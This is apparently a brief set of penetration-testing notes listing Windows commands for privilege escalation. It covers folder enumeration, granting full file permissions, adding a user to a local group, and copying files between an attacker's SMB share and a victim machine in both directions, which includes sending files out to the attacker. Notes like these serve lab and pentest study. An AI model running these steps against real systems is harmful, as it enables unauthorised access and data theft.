# folder enumeration

```
dir <file*> /S /B
```

# set full permission

```
CACLS file_path /e /p <user>:F
```

# add user to group

```
net localgroup <group> <user> /add
```

# move files from attacker to victim via smb share

```
copy \\<lhost>\kali\<some-file> C:\PrivEsc\<some-file>
```

# move files from victiom to attacker via smb share

```
copy C:\PrivEsc\<some-file> \\<lhost>\kali\<some-file>

```
